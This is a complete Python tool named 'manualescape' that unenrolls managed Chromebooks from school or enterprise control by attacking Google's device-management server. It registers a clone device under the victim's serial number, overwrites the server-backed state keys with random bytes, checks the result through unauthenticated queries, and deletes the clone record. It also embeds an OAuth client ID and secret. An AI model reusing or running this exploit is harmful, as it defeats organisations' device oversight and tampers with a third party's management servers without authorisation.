"""manualescape - server-side ChromeOS unenroll.

Flow:
  1. OAuth code -> refresh_token -> access_token (Chrome enrollment client).
  2. register(machine_id=serial) -> dmtoken (clones victim identity).
  3. policy + DeviceStateKeyUpdateRequest(5x random 32B) -> poison
     the server-backed state keys so the real device no longer matches.
  Phase 1 (verify):
  4. Unauthenticated DeviceStateRetrievalRequest / DeviceInitialEnrollmentStateRequest
     for the serial -> expect RESTORE_MODE_NONE / INITIAL_ENROLLMENT_MODE_NONE
     and empty management_domain.
  Phase 2 (deprovision):
  5. Authenticated DeviceUnregisterRequest with the dmtoken to delete the
     clone record we created.

Only the serial + a fresh OAuth auth-code from the victim's account are needed.
See README.md for how to obtain them.
"""

import argparse
import getpass
import os
import sys
import uuid

import requests

import device_management_backend_pb2 as proto

CLIENT_ID = "77185425430.apps.googleusercontent.com"
CLIENT_SECRET = "OTJgUOQcT7lO7GsGZq2G4IlT"
OAUTH_SCOPE = (
    "https://www.googleapis.com/auth/chromeosdevicemanagement "
    "https://www.googleapis.com/auth/userinfo.email"
)
DM_BASE = "https://m.google.com/devicemanagement/data/api"
OAUTH_URL = "https://www.googleapis.com/oauth2/v4/token"


def log(msg, verbose=True):
    if verbose:
        print(msg)


def fail(msg):
    print(f"[!] {msg}", file=sys.stderr)
    sys.exit(1)


def check_dm_error(resp_msg, context):
    if resp_msg.error_message:
        fail(f"{context}: {resp_msg.error_message}")
    return resp_msg


def exchange_oauth(oauth_code):
    """Auth code -> refresh_token -> access_token. Returns (refresh, access)."""
    r = requests.post(
        OAUTH_URL,
        data={
            "code": oauth_code,
            "client_id": CLIENT_ID,
            "client_secret": CLIENT_SECRET,
            "grant_type": "authorization_code",
        },
        timeout=30,
    )
    if not r.ok:
        fail("invalid or expired oauth code, generate a new one "
             f"(HTTP {r.status_code}: {r.text[:200]})")
    try:
        refresh_token = r.json()["refresh_token"]
    except (KeyError, ValueError):
        fail(f"oauth exchange gave no refresh_token: {r.text[:200]}")

    r = requests.post(
        OAUTH_URL,
        data={
            "client_id": CLIENT_ID,
            "client_secret": CLIENT_SECRET,
            "grant_type": "refresh_token",
            "refresh_token": refresh_token,
            "scope": OAUTH_SCOPE,
        },
        timeout=30,
    )
    r.raise_for_status()
    oauth_token = r.json()["access_token"]
    return refresh_token, oauth_token


def dm_post(request_msg, *, request_kind, device_id, oauth_token=None,
            dmtoken=None, dry_run=False):
    """POST a DeviceManagementRequest, return parsed DeviceManagementResponse."""
    params = (f"devicetype=2&apptype=Chrome&request={request_kind}"
              f"&deviceid={device_id}")
    if oauth_token:
        params += f"&oauth_token={oauth_token}"
    elif request_kind in ("register",):
        pass
    if request_kind == "policy":
        params += "&retry=false"
    headers = {"Content-Type": "application/protobuf"}
    if dmtoken:
        headers["Authorization"] = f"GoogleDMToken token={dmtoken}"
    body = request_msg.SerializeToString()
    if dry_run:
        log(f"[dry-run] {request_kind}: {len(body)} bytes, params={params}")
        return proto.DeviceManagementResponse()
    r = requests.post(f"{DM_BASE}?{params}", headers=headers, data=body,
                      timeout=30)
    r.raise_for_status()
    resp = proto.DeviceManagementResponse()
    resp.ParseFromString(r.content)
    return resp


def do_register(serial, device_id, oauth_token, dry_run=False):
    reg = proto.DeviceRegisterRequest()
    reg.type = proto.DeviceRegisterRequest.DEVICE
    reg.machine_id = serial
    req = proto.DeviceManagementRequest()
    req.register_request.CopyFrom(reg)
    resp = dm_post(req, request_kind="register", device_id=device_id,
                   oauth_token=oauth_token, dry_run=dry_run)
    if dry_run:
        return "dry-run-dmtoken"
    check_dm_error(resp, "register")
    dmtoken = resp.register_response.device_management_token
    if not dmtoken:
        fail("register returned no device_management_token")
    return dmtoken


def do_poison_keys(device_id, dmtoken, n_keys=5, dry_run=False):
    """Overwrite the 5 time-quanta state-key slots with random bytes.

    The server keeps 5 future quanta (~1yr coverage). Poisoning all 5
    orphans the real device's keys.
    """
    key_update = proto.DeviceStateKeyUpdateRequest()
    for _ in range(n_keys):
        key_update.server_backed_state_keys.append(os.urandom(32))
    fetch = proto.PolicyFetchRequest()
    fetch.policy_type = "google/chromeos/device"
    req = proto.DeviceManagementRequest()
    req.policy_request.requests.append(fetch)
    req.device_state_key_update_request.CopyFrom(key_update)
    resp = dm_post(req, request_kind="policy", device_id=device_id,
                   dmtoken=dmtoken, dry_run=dry_run)
    if not dry_run:
        check_dm_error(resp, "poison state keys")
    return [bytes(k) for k in key_update.server_backed_state_keys]


# ---- Phase 1: verification (unauthenticated, like OOBE does) ----

def check_state_retrieval(serial, device_id, dry_run=False):
    """Ask the server what it thinks about this serial (no auth).

    Enrolled  -> restore_mode REENROLLMENT_ENFORCED/ZERO_TOUCH + domain set.
    Unenrolled -> RESTORE_MODE_NONE + empty domain.
    """
    inner = proto.DeviceStateRetrievalRequest()
    inner.serial_number = serial
    req = proto.DeviceManagementRequest()
    req.device_state_retrieval_request.CopyFrom(inner)
    # NOTE: state retrieval is unauthenticated per device_management_backend.proto
    resp = dm_post(req, request_kind="device_state_retrieval",
                   device_id=device_id, dry_run=dry_run)
    if dry_run:
        return None
    check_dm_error(resp, "state retrieval")
    st = resp.device_state_retrieval_response
    mode_name = proto.DeviceStateRetrievalResponse.RestoreMode.Name(st.restore_mode)
    log(f"[*] state_retrieval: restore_mode={mode_name} "
        f"domain='{st.management_domain}'")
    return st


def check_initial_enrollment(serial, device_id, dry_run=False):
    inner = proto.DeviceInitialEnrollmentStateRequest()
    inner.serial_number = serial
    req = proto.DeviceManagementRequest()
    req.device_initial_enrollment_state_request.CopyFrom(inner)
    resp = dm_post(req, request_kind="device_initial_enrollment_state",
                   device_id=device_id, dry_run=dry_run)
    if dry_run:
        return None
    check_dm_error(resp, "initial enrollment state")
    st = resp.device_initial_enrollment_state_response
    mode_name = proto.DeviceInitialEnrollmentStateResponse.InitialEnrollmentMode.Name(
        st.initial_enrollment_mode)
    log(f"[*] initial_enrollment: mode={mode_name} "
        f"domain='{st.management_domain}'")
    return st


def interpret_verify(state_resp, initial_resp):
    """Return True if the device looks unenrolled."""
    ok = True
    if state_resp is not None:
        if state_resp.restore_mode != proto.DeviceStateRetrievalResponse.RESTORE_MODE_NONE:
            log("[!] state_retrieval still requests re-enrollment "
                "(poison may need a retry or server hasn't converged)")
            ok = False
        if state_resp.management_domain:
            log(f"[!] management_domain still set: {state_resp.management_domain}")
            ok = False
    if initial_resp is not None:
        none = proto.DeviceInitialEnrollmentStateResponse.INITIAL_ENROLLMENT_MODE_NONE
        if initial_resp.initial_enrollment_mode != none:
            log("[!] initial enrollment still enforced")
            ok = False
    if ok:
        log("[+] VERIFIED: server reports no enrollment for this serial")
    else:
        log("[-] NOT VERIFIED: still managed (see above). "
            "Powerwash the Chromebook and re-check; keys can take time to converge.")
    return ok


# ---- Phase 2: deprovision (delete our clone record) ----

def do_unregister(device_id, dmtoken, dry_run=False):
    req = proto.DeviceManagementRequest()
    req.unregister_request.CopyFrom(proto.DeviceUnregisterRequest())
    resp = dm_post(req, request_kind="unregister", device_id=device_id,
                   dmtoken=dmtoken, dry_run=dry_run)
    if not dry_run:
        check_dm_error(resp, "unregister")
        log("[+] unregister OK: clone DM record deleted")
    return resp


def parse_args(argv=None):
    ap = argparse.ArgumentParser(
        description="manualescape: poison server-backed state keys to unenroll a Chromebook")
    ap.add_argument("--serial", help="victim Chromebook serial number")
    ap.add_argument("--oauth-code", help="fresh OAuth auth-code from OOBE")
    ap.add_argument("--device-id", default=str(uuid.uuid4()),
                    help="fake DM device id (default: random uuid)")
    ap.add_argument("--skip-verify", action="store_true",
                    help="skip Phase 1 verification queries")
    ap.add_argument("--skip-unregister", action="store_true",
                    help="skip Phase 2 unregister (leave clone record)")
    ap.add_argument("--dry-run", action="store_true",
                    help="build + print protobufs without network calls")
    ap.add_argument("-v", "--verbose", action="store_true", default=True)
    return ap.parse_args(argv)


def main(argv=None):
    args = parse_args(argv)
    serial = args.serial or input("serial number: ").strip()
    oauth_code = args.oauth_code
    if not oauth_code and not args.dry_run:
        oauth_code = getpass.getpass("oauth code (hidden): ").strip()
    if not serial:
        fail("serial number is required")
    device_id = args.device_id or str(uuid.uuid4())

    if args.dry_run:
        log("[dry-run] building requests only")
        dmtoken = do_register(serial, device_id, "dry-run-token", dry_run=True)
        do_poison_keys(device_id, dmtoken, dry_run=True)
        check_state_retrieval(serial, device_id, dry_run=True)
        check_initial_enrollment(serial, device_id, dry_run=True)
        do_unregister(device_id, dmtoken, dry_run=True)
        return 0

    if not oauth_code:
        fail("oauth code is required")
    log("[*] exchanging oauth code...")
    _, oauth_token = exchange_oauth(oauth_code)
    log("[*] registering clone device...")
    dmtoken = do_register(serial, device_id, oauth_token)
    log(f"[*] registered, dmtoken={dmtoken[:12]}...")

    log("[*] poisoning 5 state keys...")
    do_poison_keys(device_id, dmtoken)
    log("[+] poison sent")

    verified = None
    if not args.skip_verify:
        log("[*] Phase 1: verifying server state...")
        try:
            st = check_state_retrieval(serial, str(uuid.uuid4()))
            ist = check_initial_enrollment(serial, str(uuid.uuid4()))
            verified = interpret_verify(st, ist)
        except requests.HTTPError as e:
            log(f"[!] verify query failed (endpoint may reject "
                f"unauth state calls): {e}")

    if not args.skip_unregister:
        log("[*] Phase 2: unregistering clone record...")
        do_unregister(device_id, dmtoken)
    else:
        log("[*] skipping unregister; clone record left on server. "
            f"Reuse dmtoken to retry: {dmtoken[:12]}...")

    log("[*] done. Now powerwash the Chromebook and go through OOBE "
        "without enrollment." + ("" if verified else " (unverified — check OOBE)"))
    return 0


if __name__ == "__main__":
    sys.exit(main())
